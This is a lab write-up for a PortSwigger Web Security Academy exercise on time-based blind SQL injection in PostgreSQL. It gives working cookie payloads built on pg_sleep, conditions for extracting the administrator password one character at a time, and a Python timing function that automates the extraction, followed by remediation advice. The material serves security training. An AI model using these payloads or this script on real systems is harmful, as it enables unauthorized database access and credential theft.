# Blind SQL Injection with Time Delays and Information Retrieval

## Lab

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** SQL Injection  
**Technique:** Blind SQL Injection - Time-Based  
**Database:** PostgreSQL  
**Status:** Solved

---

## Objective

The application contains a blind SQL injection vulnerability in the `TrackingId` cookie.

The application does not return the results of the SQL query and does not behave differently when the query returns data or produces an error.

However, the query is executed synchronously, which allows conditional time delays to be used to infer information from the database.

The objective of the lab is to retrieve the password of the `administrator` user from the `users` table and then authenticate as that user.

---

## Initial Analysis

The vulnerable parameter is the `TrackingId` cookie.

A normal request contains:

```http
GET / HTTP/2
Host: 0a1f002c03bc236182cb61ff00f500e3.web-security-academy.net
Cookie: TrackingId=YGCQgQRjIZs1OTTj; session=F12thwMBuBTJOXBnF6yRsYaRaibFg4Vs
```

The important part of the request is:

```http
Cookie: TrackingId=YGCQgQRjIZs1OTTj
```

The application uses this value in a SQL query.

---

## Identifying the Time-Based SQL Injection

Because the application does not provide a visible indication of whether an injected condition is true or false, a time-based technique can be used.

The idea is to make the database sleep for a fixed amount of time only when a condition is true.

For PostgreSQL, the relevant function is:

```sql
pg_sleep()
```

The payload structure used was:

```sql
' || (SELECT CASE WHEN (<condition>) THEN pg_sleep(10) ELSE pg_sleep(0) END)-- -
```

This creates two possible behaviors:

```text
Condition TRUE
        ↓
   pg_sleep(10)
        ↓
Response delayed

Condition FALSE
        ↓
   pg_sleep(0)
        ↓
Normal response
```

---

## Boolean Timing Test

Before attempting to extract information, I tested two known conditions.

### TRUE condition

```sql
1=1
```

Injected through the `TrackingId` cookie:

```text
YGCQgQRjIZs1OTTj' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)-- -
```

### FALSE condition

```sql
1=2
```

The measured response times were:

```text
Normal : 1.27s
TRUE   : 11.17s
FALSE  : 1.17s
```

The results clearly demonstrate the vulnerability.

```text
1=1  → ~11 seconds
1=2  → ~1 second
```

Therefore:

```text
TRUE  → additional delay
FALSE → normal response
```

This confirmed that the application was vulnerable to time-based blind SQL injection.

---

## Information Retrieval

The lab specifies that the database contains:

```text
users
├── username
└── password
```

The target account is:

```text
administrator
```

Since query results are not directly returned, the password must be reconstructed character by character.

The first step is determining the password length.

The following condition was used:

```sql
(SELECT LENGTH(password)
 FROM users
 WHERE username='administrator')=<length>
```

The script tests different lengths until the database introduces the expected delay.

---

## Extracting the Password

Once the password length is known, each character can be tested individually.

The technique uses PostgreSQL's `SUBSTRING()` function:

```sql
(SELECT SUBSTRING(password,<position>,1)
 FROM users
 WHERE username='administrator')='<character>'
```

For example, for the first character:

```sql
(SELECT SUBSTRING(password,1,1)
 FROM users
 WHERE username='administrator')='a'
```

If the condition is true, PostgreSQL executes:

```sql
pg_sleep(10)
```

The Python script detects the delay and identifies the correct character.

This process is repeated for every position:

```text
Position 1 → character
Position 2 → character
Position 3 → character
Position 4 → character
...
```

Eventually, the complete password can be reconstructed.

---

## Python Automation

To automate the repetitive process, I created a Python script using the `requests` library.

The script performs the following tasks:

1. Sends the SQL injection through the `TrackingId` cookie.
2. Measures the HTTP response time.
3. Determines whether the injected condition was true.
4. Determines the password length.
5. Tests characters individually.
6. Reconstructs the administrator password.

Core timing logic:

```python
def check(condition):

    payload = (
        f"{TRACKING_ID}' || "
        f"(SELECT CASE WHEN ({condition}) "
        f"THEN pg_sleep({SLEEP_TIME}) "
        f"ELSE pg_sleep(0) END)-- -"
    )

    cookies = {
        "TrackingId": payload,
        "session": SESSION
    }

    start = time.monotonic()

    try:
        requests.get(
            URL,
            headers=headers,
            cookies=cookies,
            timeout=SLEEP_TIME + 5
        )

    except requests.exceptions.Timeout:
        pass

    elapsed = time.monotonic() - start

    return elapsed >= THRESHOLD
```

The automation allowed the blind SQL injection process to be performed without manually testing every character.

---

## Attack Flow

The complete attack can be represented as:

```text
TrackingId cookie
       │
       ▼
SQL Injection
       │
       ▼
Conditional SQL expression
       │
       ├── TRUE
       │     │
       │     ▼
       │  pg_sleep(10)
       │     │
       │     ▼
       │  Delayed response
       │
       └── FALSE
             │
             ▼
          pg_sleep(0)
             │
             ▼
        Normal response
```

The Python script converts this timing side channel into a boolean value:

```text
HTTP response time
        │
        ▼
   Threshold check
        │
   ┌────┴────┐
   │         │
 TRUE      FALSE
   │         │
   ▼         ▼
Character  Try next
confirmed  character
```

---

## Impact

A time-based blind SQL injection vulnerability can allow an attacker to extract sensitive database information even when:

- SQL query results are not displayed.
- SQL errors are hidden.
- The application returns the same response for successful and unsuccessful queries.

By repeatedly asking true/false questions through timing differences, sensitive information can be reconstructed.

In this lab, this technique allowed the password associated with the `administrator` account to be recovered.

---

## Remediation

The primary mitigation is to use **parameterized queries / prepared statements** instead of dynamically concatenating user-controlled values into SQL statements.

For example:

```python
cursor.execute(
    "SELECT * FROM tracking WHERE tracking_id = %s",
    (tracking_id,)
)
```

Additional defensive measures include:

- Validate and constrain cookie input.
- Use parameterized database queries throughout the application.
- Apply least-privilege database accounts.
- Avoid exposing database errors to users.
- Implement monitoring for abnormal query behavior.
- Consider rate limiting suspicious requests.
- Perform regular security testing against SQL injection vulnerabilities.

---

## Key Takeaways

This lab demonstrated that SQL injection does not require visible database output.

A vulnerable application can leak information through a **timing side channel**.

The main lessons were:

- Blind SQL injection can be exploited without visible query results.
- Conditional delays can act as a TRUE/FALSE oracle.
- PostgreSQL provides `pg_sleep()` for time-based testing.
- Database information can be extracted one condition at a time.
- Automation is essential because blind extraction can require a large number of HTTP requests.
- Response-time thresholds must account for normal network latency to avoid false positives.

---

## Tools Used

- Burp Suite
- PortSwigger Web Security Academy
- Python 3
- `requests`
- PostgreSQL SQL syntax

---

## References

- PortSwigger Web Security Academy - SQL Injection
- PortSwigger Web Security Academy - Blind SQL Injection
- OWASP - SQL Injection Prevention Cheat Sheet
